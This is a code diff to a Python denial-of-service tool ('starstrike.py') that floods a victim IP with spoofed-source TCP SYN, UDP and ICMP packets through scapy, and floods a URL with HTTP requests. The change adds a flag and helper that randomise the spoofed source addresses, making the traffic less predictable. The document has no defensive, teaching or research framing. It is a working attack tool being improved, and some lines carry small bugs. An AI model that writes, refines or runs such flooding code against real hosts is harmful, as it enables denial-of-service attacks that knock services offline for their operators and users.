@@ -30,6 +30,7 @@ from scapy.all import send, IP, TCP, UDP, Raw, ICMP
 from aiohttp import TCPConnector, ClientTimeout, ClientSession, ClientError
 import asyncio
 from fake_useragent import UserAgent
+from secrets import randbelow
 
 def print_banner():
     print(r'''
@@ -55,7 +56,8 @@ dest_ip="127.0.0.1"
 lock_port=True
 port=3703
 dest_url = "about:blank"
-n_requests = 1000
+n_req = 1000
+up_ip = False
 
 #validate ip
 def validate_ip(ip):
@@ -94,11 +96,18 @@ if len(sys.argv) > 1:
             if not port>10000: exit(f"Port {port} is invalid!")
         # set number of requests for http flood
         if arg.startswith("--rqn"):
-            n_requests == int(arg.removeprefix("--rqn"))
+            n_req == int(arg.removeprefix("--rqn"))
+        # make ip unpredictable (use secrets.randbelow() instead of random.randint())
+        if arg == "--upip":
+            up_ip = True
 else: exit("Check the code to see how you configure it, or just do python starstrike.py --victimip[target ip]")
 
 #stop event
 stop = threading.Event()
+
+def gen_ip():
+    if not up_ip: return f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+    return f"{randbelow(255)}.{randbelow(255)}.{randbelow(255)}.{randbelow(255)}"
 
 #-- attack types --#
 
@@ -109,7 +118,7 @@ def tcp_flood(thread):
     while not stop.is_set():
         if not lock_port: port = random.randint(0, 9999) #if lock_port is False, generate a random port (idk why i added this)
         payload = os.urandom(payload_size) #create a payload with random contents
-        source = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" #generate a random source ip
+        source = gen_ip() #generate a random source ip
         packet = IP(src = source, dst = dest_ip) / TCP(dport = port, flags = 'S') / Raw(load = payload) #create a packet with a spoofed ip
         try:send(packet, verbose=False) #send the packet
         except Exception as e: print(e)
@@ -123,7 +132,7 @@ def icmp_flood(thread):
     while not stop.is_set():
         if not lock_port: port = random.randint(0, 9999)
         payload = os.urandom(payload_size)
-        source = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+        source = gen_ip()
         packet = IP(src = source, dst = dest_ip) / ICMP() / Raw(load = payload)
         send(packet, verbose=False)
         tsize += payload_size
@@ -137,7 +146,7 @@ def udp_flood(thread):
     while not stop.is_set():
         if not lock_port: port = random.randint(0, 9999)
         payload = os.urandom(payload_size)
-        source = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+        source = gen_ip()
         packet = IP(src = source, dst = dest_ip) / UDP(dport=port) / Raw(load = payload)
         try: send(packet, verbose=False)
         except Exception as e: print(e)
@@ -165,7 +174,7 @@ async def send_req(session, thread):
         print(f"[HTTP] client error \n{e}")
 
 #http flood attack
-async def http_flood(n_req, thread):
+async def http_flood(thread):
     connection = TCPConnector()
     timeout = ClientTimeout(total=10)
     async with ClientSession(connector = connection, timeout = timeout) as session:
@@ -188,7 +197,7 @@ def attack(thread):
         case "tcp": tcp_flood(thread)
         case "udp": udp_flood(thread)
         case "icmp": icmp_flood(thread)
-        case "http": http_flood()
+        case "http": http_flood(thread)
 
 #-- MAIN --#
 def main():
